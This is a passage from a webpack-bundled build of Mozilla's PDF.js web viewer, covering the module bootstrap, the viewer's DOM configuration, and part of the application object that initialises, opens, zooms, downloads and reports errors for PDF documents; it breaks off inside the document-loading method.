/**
 * @licstart The following is the entire license notice for the
 * Javascript code in this page
 *
 * Copyright 2020 Mozilla Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * @licend The above is the entire license notice for the
 * Javascript code in this page
 */

/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


;
let pdfjsWebApp, pdfjsWebAppOptions;
{
  pdfjsWebApp = __webpack_require__(1);
  pdfjsWebAppOptions = __webpack_require__(3);
}
;
{
  __webpack_require__(33);
}
;
{
  __webpack_require__(38);
}

function getViewerConfiguration() {
  return {
    appContainer: document.body,
    mainContainer: document.getElementById("viewerContainer"),
    viewerContainer: document.getElementById("viewer"),
    eventBus: null,
    toolbar: {
      container: document.getElementById("toolbarViewer"),
      numPages: document.getElementById("numPages"),
      pageNumber: document.getElementById("pageNumber"),
      scaleSelectContainer: document.getElementById("scaleSelectContainer"),
      scaleSelect: document.getElementById("scaleSelect"),
      customScaleOption: document.getElementById("customScaleOption"),
      previous: document.getElementById("previous"),
      next: document.getElementById("next"),
      zoomIn: document.getElementById("zoomIn"),
      zoomOut: document.getElementById("zoomOut"),
      viewFind: document.getElementById("viewFind"),
      openFile: document.getElementById("openFile"),
      print: document.getElementById("print"),
      presentationModeButton: document.getElementById("presentationMode"),
      download: document.getElementById("download"),
      viewBookmark: document.getElementById("viewBookmark")
    },
    secondaryToolbar: {
      toolbar: document.getElementById("secondaryToolbar"),
      toggleButton: document.getElementById("secondaryToolbarToggle"),
      toolbarButtonContainer: document.getElementById("secondaryToolbarButtonContainer"),
      presentationModeButton: document.getElementById("secondaryPresentationMode"),
      openFileButton: document.getElementById("secondaryOpenFile"),
      printButton: document.getElementById("secondaryPrint"),
      downloadButton: document.getElementById("secondaryDownload"),
      viewBookmarkButton: document.getElementById("secondaryViewBookmark"),
      firstPageButton: document.getElementById("firstPage"),
      lastPageButton: document.getElementById("lastPage"),
      pageRotateCwButton: document.getElementById("pageRotateCw"),
      pageRotateCcwButton: document.getElementById("pageRotateCcw"),
      cursorSelectToolButton: document.getElementById("cursorSelectTool"),
      cursorHandToolButton: document.getElementById("cursorHandTool"),
      scrollVerticalButton: document.getElementById("scrollVertical"),
      scrollHorizontalButton: document.getElementById("scrollHorizontal"),
      scrollWrappedButton: document.getElementById("scrollWrapped"),
      spreadNoneButton: document.getElementById("spreadNone"),
      spreadOddButton: document.getElementById("spreadOdd"),
      spreadEvenButton: document.getElementById("spreadEven"),
      documentPropertiesButton: document.getElementById("documentProperties")
    },
    fullscreen: {
      contextFirstPage: document.getElementById("contextFirstPage"),
      contextLastPage: document.getElementById("contextLastPage"),
      contextPageRotateCw: document.getElementById("contextPageRotateCw"),
      contextPageRotateCcw: document.getElementById("contextPageRotateCcw")
    },
    sidebar: {
      outerContainer: document.getElementById("outerContainer"),
      viewerContainer: document.getElementById("viewerContainer"),
      toggleButton: document.getElementById("sidebarToggle"),
      thumbnailButton: document.getElementById("viewThumbnail"),
      outlineButton: document.getElementById("viewOutline"),
      attachmentsButton: document.getElementById("viewAttachments"),
      thumbnailView: document.getElementById("thumbnailView"),
      outlineView: document.getElementById("outlineView"),
      attachmentsView: document.getElementById("attachmentsView")
    },
    sidebarResizer: {
      outerContainer: document.getElementById("outerContainer"),
      resizer: document.getElementById("sidebarResizer")
    },
    findBar: {
      bar: document.getElementById("findbar"),
      toggleButton: document.getElementById("viewFind"),
      findField: document.getElementById("findInput"),
      highlightAllCheckbox: document.getElementById("findHighlightAll"),
      caseSensitiveCheckbox: document.getElementById("findMatchCase"),
      entireWordCheckbox: document.getElementById("findEntireWord"),
      findMsg: document.getElementById("findMsg"),
      findResultsCount: document.getElementById("findResultsCount"),
      findPreviousButton: document.getElementById("findPrevious"),
      findNextButton: document.getElementById("findNext")
    },
    passwordOverlay: {
      overlayName: "passwordOverlay",
      container: document.getElementById("passwordOverlay"),
      label: document.getElementById("passwordText"),
      input: document.getElementById("password"),
      submitButton: document.getElementById("passwordSubmit"),
      cancelButton: document.getElementById("passwordCancel")
    },
    documentProperties: {
      overlayName: "documentPropertiesOverlay",
      container: document.getElementById("documentPropertiesOverlay"),
      closeButton: document.getElementById("documentPropertiesClose"),
      fields: {
        fileName: document.getElementById("fileNameField"),
        fileSize: document.getElementById("fileSizeField"),
        title: document.getElementById("titleField"),
        author: document.getElementById("authorField"),
        subject: document.getElementById("subjectField"),
        keywords: document.getElementById("keywordsField"),
        creationDate: document.getElementById("creationDateField"),
        modificationDate: document.getElementById("modificationDateField"),
        creator: document.getElementById("creatorField"),
        producer: document.getElementById("producerField"),
        version: document.getElementById("versionField"),
        pageCount: document.getElementById("pageCountField"),
        pageSize: document.getElementById("pageSizeField"),
        linearized: document.getElementById("linearizedField")
      }
    },
    errorWrapper: {
      container: document.getElementById("errorWrapper"),
      errorMessage: document.getElementById("errorMessage"),
      closeButton: document.getElementById("errorClose"),
      errorMoreInfo: document.getElementById("errorMoreInfo"),
      moreInfoButton: document.getElementById("errorShowMore"),
      lessInfoButton: document.getElementById("errorShowLess")
    },
    printContainer: document.getElementById("printContainer"),
    openFileInputName: "fileInput",
    debuggerScriptPath: "./debugger.js"
  };
}

function webViewerLoad() {
  const config = getViewerConfiguration();
  window.PDFViewerApplication = pdfjsWebApp.PDFViewerApplication;
  window.PDFViewerApplicationOptions = pdfjsWebAppOptions.AppOptions;
  const event = document.createEvent("CustomEvent");
  event.initCustomEvent("webviewerloaded", true, true, {
    source: window
  });

  try {
    parent.document.dispatchEvent(event);
  } catch (ex) {
    console.error(`webviewerloaded: ${ex}`);
    document.dispatchEvent(event);
  }

  pdfjsWebApp.PDFViewerApplication.run(config);
}

if (document.readyState === "interactive" || document.readyState === "complete") {
  webViewerLoad();
} else {
  document.addEventListener("DOMContentLoaded", webViewerLoad, true);
}

/***/ }),
/* 1 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.PDFPrintServiceFactory = exports.DefaultExternalServices = exports.PDFViewerApplication = void 0;

var _ui_utils = __webpack_require__(2);

var _app_options = __webpack_require__(3);

var _pdfjsLib = __webpack_require__(5);

var _pdf_cursor_tools = __webpack_require__(6);

var _pdf_rendering_queue = __webpack_require__(8);

var _pdf_sidebar = __webpack_require__(9);

var _overlay_manager = __webpack_require__(10);

var _password_prompt = __webpack_require__(11);

var _pdf_attachment_viewer = __webpack_require__(12);

var _pdf_document_properties = __webpack_require__(13);

var _pdf_find_bar = __webpack_require__(14);

var _pdf_find_controller = __webpack_require__(15);

var _pdf_history = __webpack_require__(17);

var _pdf_link_service = __webpack_require__(18);

var _pdf_outline_viewer = __webpack_require__(19);

var _pdf_presentation_mode = __webpack_require__(20);

var _pdf_sidebar_resizer = __webpack_require__(21);

var _pdf_thumbnail_viewer = __webpack_require__(22);

var _pdf_viewer = __webpack_require__(24);

var _secondary_toolbar = __webpack_require__(29);

var _toolbar = __webpack_require__(31);

var _view_history = __webpack_require__(32);

const DEFAULT_SCALE_DELTA = 1.1;
const DISABLE_AUTO_FETCH_LOADING_BAR_TIMEOUT = 5000;
const FORCE_PAGES_LOADED_TIMEOUT = 10000;
const WHEEL_ZOOM_DISABLED_TIMEOUT = 1000;
const ENABLE_PERMISSIONS_CLASS = "enablePermissions";
const ViewOnLoad = {
  UNKNOWN: -1,
  PREVIOUS: 0,
  INITIAL: 1
};

class DefaultExternalServices {
  constructor() {
    throw new Error("Cannot initialize DefaultExternalServices.");
  }

  static updateFindControlState(data) {}

  static updateFindMatchesCount(data) {}

  static initPassiveLoading(callbacks) {}

  static fallback(data, callback) {}

  static reportTelemetry(data) {}

  static createDownloadManager(options) {
    throw new Error("Not implemented: createDownloadManager");
  }

  static createPreferences() {
    throw new Error("Not implemented: createPreferences");
  }

  static createL10n(options) {
    throw new Error("Not implemented: createL10n");
  }

  static get supportsIntegratedFind() {
    return (0, _pdfjsLib.shadow)(this, "supportsIntegratedFind", false);
  }

  static get supportsDocumentFonts() {
    return (0, _pdfjsLib.shadow)(this, "supportsDocumentFonts", true);
  }

  static get supportedMouseWheelZoomModifierKeys() {
    return (0, _pdfjsLib.shadow)(this, "supportedMouseWheelZoomModifierKeys", {
      ctrlKey: true,
      metaKey: true
    });
  }

  static get isInAutomation() {
    return (0, _pdfjsLib.shadow)(this, "isInAutomation", false);
  }

}

exports.DefaultExternalServices = DefaultExternalServices;
const PDFViewerApplication = {
  initialBookmark: document.location.hash.substring(1),
  _initializedCapability: (0, _pdfjsLib.createPromiseCapability)(),
  fellback: false,
  appConfig: null,
  pdfDocument: null,
  pdfLoadingTask: null,
  printService: null,
  pdfViewer: null,
  pdfThumbnailViewer: null,
  pdfRenderingQueue: null,
  pdfPresentationMode: null,
  pdfDocumentProperties: null,
  pdfLinkService: null,
  pdfHistory: null,
  pdfSidebar: null,
  pdfSidebarResizer: null,
  pdfOutlineViewer: null,
  pdfAttachmentViewer: null,
  pdfCursorTools: null,
  store: null,
  downloadManager: null,
  overlayManager: null,
  preferences: null,
  toolbar: null,
  secondaryToolbar: null,
  eventBus: null,
  l10n: null,
  isInitialViewSet: false,
  downloadComplete: false,
  isViewerEmbedded: window.parent !== window,
  url: "",
  baseUrl: "",
  externalServices: DefaultExternalServices,
  _boundEvents: {},
  contentDispositionFilename: null,

  async initialize(appConfig) {
    this.preferences = this.externalServices.createPreferences();
    this.appConfig = appConfig;
    await this._readPreferences();
    await this._parseHashParameters();
    await this._initializeL10n();

    if (this.isViewerEmbedded && _app_options.AppOptions.get("externalLinkTarget") === _pdfjsLib.LinkTarget.NONE) {
      _app_options.AppOptions.set("externalLinkTarget", _pdfjsLib.LinkTarget.TOP);
    }

    await this._initializeViewerComponents();
    this.bindEvents();
    this.bindWindowEvents();
    const appContainer = appConfig.appContainer || document.documentElement;
    this.l10n.translate(appContainer).then(() => {
      this.eventBus.dispatch("localized", {
        source: this
      });
    });

    this._initializedCapability.resolve();
  },

  async _readPreferences() {
    if (_app_options.AppOptions.get("disablePreferences")) {
      return;
    }

    try {
      const prefs = await this.preferences.getAll();

      for (const name in prefs) {
        _app_options.AppOptions.set(name, prefs[name]);
      }
    } catch (reason) {
      console.error(`_readPreferences: "${reason.message}".`);
    }
  },

  async _parseHashParameters() {
    if (!_app_options.AppOptions.get("pdfBugEnabled")) {
      return undefined;
    }

    const hash = document.location.hash.substring(1);

    if (!hash) {
      return undefined;
    }

    const hashParams = (0, _ui_utils.parseQueryString)(hash),
          waitOn = [];

    if ("disableworker" in hashParams && hashParams.disableworker === "true") {
      waitOn.push(loadFakeWorker());
    }

    if ("disablerange" in hashParams) {
      _app_options.AppOptions.set("disableRange", hashParams.disablerange === "true");
    }

    if ("disablestream" in hashParams) {
      _app_options.AppOptions.set("disableStream", hashParams.disablestream === "true");
    }

    if ("disableautofetch" in hashParams) {
      _app_options.AppOptions.set("disableAutoFetch", hashParams.disableautofetch === "true");
    }

    if ("disablefontface" in hashParams) {
      _app_options.AppOptions.set("disableFontFace", hashParams.disablefontface === "true");
    }

    if ("disablehistory" in hashParams) {
      _app_options.AppOptions.set("disableHistory", hashParams.disablehistory === "true");
    }

    if ("webgl" in hashParams) {
      _app_options.AppOptions.set("enableWebGL", hashParams.webgl === "true");
    }

    if ("verbosity" in hashParams) {
      _app_options.AppOptions.set("verbosity", hashParams.verbosity | 0);
    }

    if ("textlayer" in hashParams) {
      switch (hashParams.textlayer) {
        case "off":
          _app_options.AppOptions.set("textLayerMode", _ui_utils.TextLayerMode.DISABLE);

          break;

        case "visible":
        case "shadow":
        case "hover":
          const viewer = this.appConfig.viewerContainer;
          viewer.classList.add("textLayer-" + hashParams.textlayer);
          break;
      }
    }

    if ("pdfbug" in hashParams) {
      _app_options.AppOptions.set("pdfBug", true);

      _app_options.AppOptions.set("fontExtraProperties", true);

      const enabled = hashParams.pdfbug.split(",");
      waitOn.push(loadAndEnablePDFBug(enabled));
    }

    if ("locale" in hashParams) {
      _app_options.AppOptions.set("locale", hashParams.locale);
    }

    return Promise.all(waitOn).catch(reason => {
      console.error(`_parseHashParameters: "${reason.message}".`);
    });
  },

  async _initializeL10n() {
    this.l10n = this.externalServices.createL10n({
      locale: _app_options.AppOptions.get("locale")
    });
    const dir = await this.l10n.getDirection();
    document.getElementsByTagName("html")[0].dir = dir;
  },

  async _initializeViewerComponents() {
    const appConfig = this.appConfig;
    const eventBus = appConfig.eventBus || new _ui_utils.EventBus({
      isInAutomation: this.externalServices.isInAutomation
    });
    this.eventBus = eventBus;
    this.overlayManager = new _overlay_manager.OverlayManager();
    const pdfRenderingQueue = new _pdf_rendering_queue.PDFRenderingQueue();
    pdfRenderingQueue.onIdle = this.cleanup.bind(this);
    this.pdfRenderingQueue = pdfRenderingQueue;
    const pdfLinkService = new _pdf_link_service.PDFLinkService({
      eventBus,
      externalLinkTarget: _app_options.AppOptions.get("externalLinkTarget"),
      externalLinkRel: _app_options.AppOptions.get("externalLinkRel"),
      ignoreDestinationZoom: _app_options.AppOptions.get("ignoreDestinationZoom")
    });
    this.pdfLinkService = pdfLinkService;
    const downloadManager = this.externalServices.createDownloadManager({
      disableCreateObjectURL: _app_options.AppOptions.get("disableCreateObjectURL")
    });
    this.downloadManager = downloadManager;
    const findController = new _pdf_find_controller.PDFFindController({
      linkService: pdfLinkService,
      eventBus
    });
    this.findController = findController;
    const container = appConfig.mainContainer;
    const viewer = appConfig.viewerContainer;
    this.pdfViewer = new _pdf_viewer.PDFViewer({
      container,
      viewer,
      eventBus,
      renderingQueue: pdfRenderingQueue,
      linkService: pdfLinkService,
      downloadManager,
      findController,
      renderer: _app_options.AppOptions.get("renderer"),
      enableWebGL: _app_options.AppOptions.get("enableWebGL"),
      l10n: this.l10n,
      textLayerMode: _app_options.AppOptions.get("textLayerMode"),
      imageResourcesPath: _app_options.AppOptions.get("imageResourcesPath"),
      renderInteractiveForms: _app_options.AppOptions.get("renderInteractiveForms"),
      enablePrintAutoRotate: _app_options.AppOptions.get("enablePrintAutoRotate"),
      useOnlyCssZoom: _app_options.AppOptions.get("useOnlyCssZoom"),
      maxCanvasPixels: _app_options.AppOptions.get("maxCanvasPixels")
    });
    pdfRenderingQueue.setViewer(this.pdfViewer);
    pdfLinkService.setViewer(this.pdfViewer);
    this.pdfThumbnailViewer = new _pdf_thumbnail_viewer.PDFThumbnailViewer({
      container: appConfig.sidebar.thumbnailView,
      renderingQueue: pdfRenderingQueue,
      linkService: pdfLinkService,
      l10n: this.l10n
    });
    pdfRenderingQueue.setThumbnailViewer(this.pdfThumbnailViewer);
    this.pdfHistory = new _pdf_history.PDFHistory({
      linkService: pdfLinkService,
      eventBus
    });
    pdfLinkService.setHistory(this.pdfHistory);

    if (!this.supportsIntegratedFind) {
      this.findBar = new _pdf_find_bar.PDFFindBar(appConfig.findBar, eventBus, this.l10n);
    }

    this.pdfDocumentProperties = new _pdf_document_properties.PDFDocumentProperties(appConfig.documentProperties, this.overlayManager, eventBus, this.l10n);
    this.pdfCursorTools = new _pdf_cursor_tools.PDFCursorTools({
      container,
      eventBus,
      cursorToolOnLoad: _app_options.AppOptions.get("cursorToolOnLoad")
    });
    this.toolbar = new _toolbar.Toolbar(appConfig.toolbar, eventBus, this.l10n);
    this.secondaryToolbar = new _secondary_toolbar.SecondaryToolbar(appConfig.secondaryToolbar, container, eventBus);

    if (this.supportsFullscreen) {
      this.pdfPresentationMode = new _pdf_presentation_mode.PDFPresentationMode({
        container,
        pdfViewer: this.pdfViewer,
        eventBus,
        contextMenuItems: appConfig.fullscreen
      });
    }

    this.passwordPrompt = new _password_prompt.PasswordPrompt(appConfig.passwordOverlay, this.overlayManager, this.l10n);
    this.pdfOutlineViewer = new _pdf_outline_viewer.PDFOutlineViewer({
      container: appConfig.sidebar.outlineView,
      eventBus,
      linkService: pdfLinkService
    });
    this.pdfAttachmentViewer = new _pdf_attachment_viewer.PDFAttachmentViewer({
      container: appConfig.sidebar.attachmentsView,
      eventBus,
      downloadManager
    });
    this.pdfSidebar = new _pdf_sidebar.PDFSidebar({
      elements: appConfig.sidebar,
      pdfViewer: this.pdfViewer,
      pdfThumbnailViewer: this.pdfThumbnailViewer,
      eventBus,
      l10n: this.l10n
    });
    this.pdfSidebar.onToggled = this.forceRendering.bind(this);
    this.pdfSidebarResizer = new _pdf_sidebar_resizer.PDFSidebarResizer(appConfig.sidebarResizer, eventBus, this.l10n);
  },

  run(config) {
    this.initialize(config).then(webViewerInitialized);
  },

  get initialized() {
    return this._initializedCapability.settled;
  },

  get initializedPromise() {
    return this._initializedCapability.promise;
  },

  zoomIn(ticks) {
    if (this.pdfViewer.isInPresentationMode) {
      return;
    }

    let newScale = this.pdfViewer.currentScale;

    do {
      newScale = (newScale * DEFAULT_SCALE_DELTA).toFixed(2);
      newScale = Math.ceil(newScale * 10) / 10;
      newScale = Math.min(_ui_utils.MAX_SCALE, newScale);
    } while (--ticks > 0 && newScale < _ui_utils.MAX_SCALE);

    this.pdfViewer.currentScaleValue = newScale;
  },

  zoomOut(ticks) {
    if (this.pdfViewer.isInPresentationMode) {
      return;
    }

    let newScale = this.pdfViewer.currentScale;

    do {
      newScale = (newScale / DEFAULT_SCALE_DELTA).toFixed(2);
      newScale = Math.floor(newScale * 10) / 10;
      newScale = Math.max(_ui_utils.MIN_SCALE, newScale);
    } while (--ticks > 0 && newScale > _ui_utils.MIN_SCALE);

    this.pdfViewer.currentScaleValue = newScale;
  },

  zoomReset() {
    if (this.pdfViewer.isInPresentationMode) {
      return;
    }

    this.pdfViewer.currentScaleValue = _ui_utils.DEFAULT_SCALE_VALUE;
  },

  get pagesCount() {
    return this.pdfDocument ? this.pdfDocument.numPages : 0;
  },

  get page() {
    return this.pdfViewer.currentPageNumber;
  },

  set page(val) {
    this.pdfViewer.currentPageNumber = val;
  },

  get printing() {
    return !!this.printService;
  },

  get supportsPrinting() {
    return PDFPrintServiceFactory.instance.supportsPrinting;
  },

  get supportsFullscreen() {
    let support;
    const doc = document.documentElement;
    support = !!(doc.requestFullscreen || doc.mozRequestFullScreen || doc.webkitRequestFullScreen || doc.msRequestFullscreen);

    if (document.fullscreenEnabled === false || document.mozFullScreenEnabled === false || document.webkitFullscreenEnabled === false || document.msFullscreenEnabled === false) {
      support = false;
    }

    return (0, _pdfjsLib.shadow)(this, "supportsFullscreen", support);
  },

  get supportsIntegratedFind() {
    return this.externalServices.supportsIntegratedFind;
  },

  get supportsDocumentFonts() {
    return this.externalServices.supportsDocumentFonts;
  },

  get loadingBar() {
    const bar = new _ui_utils.ProgressBar("#loadingBar");
    return (0, _pdfjsLib.shadow)(this, "loadingBar", bar);
  },

  get supportedMouseWheelZoomModifierKeys() {
    return this.externalServices.supportedMouseWheelZoomModifierKeys;
  },

  initPassiveLoading() {
    throw new Error("Not implemented: initPassiveLoading");
  },

  setTitleUsingUrl(url = "") {
    this.url = url;
    this.baseUrl = url.split("#")[0];
    let title = (0, _ui_utils.getPDFFileNameFromURL)(url, "");

    if (!title) {
      try {
        title = decodeURIComponent((0, _pdfjsLib.getFilenameFromUrl)(url)) || url;
      } catch (ex) {
        title = url;
      }
    }

    this.setTitle(title);
  },

  setTitle(title) {
    if (this.isViewerEmbedded) {
      return;
    }

    document.title = title;
  },

  async close() {
    const errorWrapper = this.appConfig.errorWrapper.container;
    errorWrapper.setAttribute("hidden", "true");

    if (!this.pdfLoadingTask) {
      return undefined;
    }

    const promise = this.pdfLoadingTask.destroy();
    this.pdfLoadingTask = null;

    if (this.pdfDocument) {
      this.pdfDocument = null;
      this.pdfThumbnailViewer.setDocument(null);
      this.pdfViewer.setDocument(null);
      this.pdfLinkService.setDocument(null);
      this.pdfDocumentProperties.setDocument(null);
    }

    webViewerResetPermissions();
    this.store = null;
    this.isInitialViewSet = false;
    this.downloadComplete = false;
    this.url = "";
    this.baseUrl = "";
    this.contentDispositionFilename = null;
    this.pdfSidebar.reset();
    this.pdfOutlineViewer.reset();
    this.pdfAttachmentViewer.reset();

    if (this.pdfHistory) {
      this.pdfHistory.reset();
    }

    if (this.findBar) {
      this.findBar.reset();
    }

    this.toolbar.reset();
    this.secondaryToolbar.reset();

    if (typeof PDFBug !== "undefined") {
      PDFBug.cleanup();
    }

    return promise;
  },

  async open(file, args) {
    if (this.pdfLoadingTask) {
      await this.close();
    }

    const workerParameters = _app_options.AppOptions.getAll(_app_options.OptionKind.WORKER);

    for (const key in workerParameters) {
      _pdfjsLib.GlobalWorkerOptions[key] = workerParameters[key];
    }

    const parameters = Object.create(null);

    if (typeof file === "string") {
      this.setTitleUsingUrl(file);
      parameters.url = file;
    } else if (file && "byteLength" in file) {
      parameters.data = file;
    } else if (file.url && file.originalUrl) {
      this.setTitleUsingUrl(file.originalUrl);
      parameters.url = file.url;
    }

    const apiParameters = _app_options.AppOptions.getAll(_app_options.OptionKind.API);

    for (const key in apiParameters) {
      let value = apiParameters[key];

      if (key === "docBaseUrl" && !value) {}

      parameters[key] = value;
    }

    if (args) {
      for (const key in args) {
        const value = args[key];

        if (key === "length") {
          this.pdfDocumentProperties.setFileSize(value);
        }

        parameters[key] = value;
      }
    }

    const loadingTask = (0, _pdfjsLib.getDocument)(parameters);
    this.pdfLoadingTask = loadingTask;

    loadingTask.onPassword = (updateCallback, reason) => {
      this.pdfLinkService.externalLinkEnabled = false;
      this.passwordPrompt.setUpdateCallback(updateCallback, reason);
      this.passwordPrompt.open();
    };

    loadingTask.onProgress = ({
      loaded,
      total
    }) => {
      this.progress(loaded / total);
    };

    loadingTask.onUnsupportedFeature = this.fallback.bind(this);
    return loadingTask.promise.then(pdfDocument => {
      this.load(pdfDocument);
    }, exception => {
      if (loadingTask !== this.pdfLoadingTask) {
        return undefined;
      }

      const message = exception && exception.message;
      let loadingErrorMessage;

      if (exception instanceof _pdfjsLib.InvalidPDFException) {
        loadingErrorMessage = this.l10n.get("invalid_file_error", null, "Invalid or corrupted PDF file.");
      } else if (exception instanceof _pdfjsLib.MissingPDFException) {
        loadingErrorMessage = this.l10n.get("missing_file_error", null, "Missing PDF file.");
      } else if (exception instanceof _pdfjsLib.UnexpectedResponseException) {
        loadingErrorMessage = this.l10n.get("unexpected_response_error", null, "Unexpected server response.");
      } else {
        loadingErrorMessage = this.l10n.get("loading_error", null, "An error occurred while loading the PDF.");
      }

      return loadingErrorMessage.then(msg => {
        this.error(msg, {
          message
        });
        throw exception;
      });
    });
  },

  download() {
    function downloadByUrl() {
      downloadManager.downloadUrl(url, filename);
    }

    const url = this.baseUrl;
    const filename = this.contentDispositionFilename || (0, _ui_utils.getPDFFileNameFromURL)(this.url);
    const downloadManager = this.downloadManager;

    downloadManager.onerror = err => {
      this.error(`PDF failed to download: ${err}`);
    };

    if (!this.pdfDocument || !this.downloadComplete) {
      downloadByUrl();
      return;
    }

    this.pdfDocument.getData().then(function (data) {
      const blob = new Blob([data], {
        type: "application/pdf"
      });
      downloadManager.download(blob, url, filename);
    }).catch(downloadByUrl);
  },

  fallback(featureId) {
    if (this.fellback) {
      return;
    }

    this.fellback = true;
    this.externalServices.fallback({
      featureId,
      url: this.baseUrl
    }, function response(download) {
      if (!download) {
        return;
      }

      PDFViewerApplication.download();
    });
  },

  error(message, moreInfo) {
    const moreInfoText = [this.l10n.get("error_version_info", {
      version: _pdfjsLib.version || "?",
      build: _pdfjsLib.build || "?"
    }, "PDF.js v{{version}} (build: {{build}})")];

    if (moreInfo) {
      moreInfoText.push(this.l10n.get("error_message", {
        message: moreInfo.message
      }, "Message: {{message}}"));

      if (moreInfo.stack) {
        moreInfoText.push(this.l10n.get("error_stack", {
          stack: moreInfo.stack
        }, "Stack: {{stack}}"));
      } else {
        if (moreInfo.filename) {
          moreInfoText.push(this.l10n.get("error_file", {
            file: moreInfo.filename
          }, "File: {{file}}"));
        }

        if (moreInfo.lineNumber) {
          moreInfoText.push(this.l10n.get("error_line", {
            line: moreInfo.lineNumber
          }, "Line: {{line}}"));
        }
      }
    }

    const errorWrapperConfig = this.appConfig.errorWrapper;
    const errorWrapper = errorWrapperConfig.container;
    errorWrapper.removeAttribute("hidden");
    const errorMessage = errorWrapperConfig.errorMessage;
    errorMessage.textContent = message;
    const closeButton = errorWrapperConfig.closeButton;

    closeButton.onclick = function () {
      errorWrapper.setAttribute("hidden", "true");
    };

    const errorMoreInfo = errorWrapperConfig.errorMoreInfo;
    const moreInfoButton = errorWrapperConfig.moreInfoButton;
    const lessInfoButton = errorWrapperConfig.lessInfoButton;

    moreInfoButton.onclick = function () {
      errorMoreInfo.removeAttribute("hidden");
      moreInfoButton.setAttribute("hidden", "true");
      lessInfoButton.removeAttribute("hidden");
      errorMoreInfo.style.height = errorMoreInfo.scrollHeight + "px";
    };

    lessInfoButton.onclick = function () {
      errorMoreInfo.setAttribute("hidden", "true");
      moreInfoButton.removeAttribute("hidden");
      lessInfoButton.setAttribute("hidden", "true");
    };

    moreInfoButton.oncontextmenu = _ui_utils.noContextMenuHandler;
    lessInfoButton.oncontextmenu = _ui_utils.noContextMenuHandler;
    closeButton.oncontextmenu = _ui_utils.noContextMenuHandler;
    moreInfoButton.removeAttribute("hidden");
    lessInfoButton.setAttribute("hidden", "true");
    Promise.all(moreInfoText).then(parts => {
      errorMoreInfo.value = parts.join("\n");
    });
  },

  progress(level) {
    if (this.downloadComplete) {
      return;
    }

    const percent = Math.round(level * 100);

    if (percent > this.loadingBar.percent || isNaN(percent)) {
      this.loadingBar.percent = percent;
      const disableAutoFetch = this.pdfDocument ? this.pdfDocument.loadingParams.disableAutoFetch : _app_options.AppOptions.get("disableAutoFetch");

      if (disableAutoFetch && percent) {
        if (this.disableAutoFetchLoadingBarTimeout) {
          clearTimeout(this.disableAutoFetchLoadingBarTimeout);
          this.disableAutoFetchLoadingBarTimeout = null;
        }

        this.loadingBar.show();
        this.disableAutoFetchLoadingBarTimeout = setTimeout(() => {
          this.loadingBar.hide();
          this.disableAutoFetchLoadingBarTimeout = null;
        }, DISABLE_AUTO_FETCH_LOADING_BAR_TIMEOUT);
      }
    }
  },

  load(pdfDocument) {
    this.pdfDocument = pdfDocument;
    pdfDocument.getDownloadInfo().then(() => {
      this.downloadComplete = true;
      this.loadingBar.hide();
      firstPagePromise.then(() => {
        this.eventBus.dispatch("documentloaded", {
          source: this
        });
      });
    });
    const pageLayoutPromise = pdfDocument.getPageLayout().catch(function () {});
    const pageModePromise = pdfDocument.getPageMode().catch(function () {});
    const openActionPromise = pdfDocument.getOpenAction().catch(function () {});
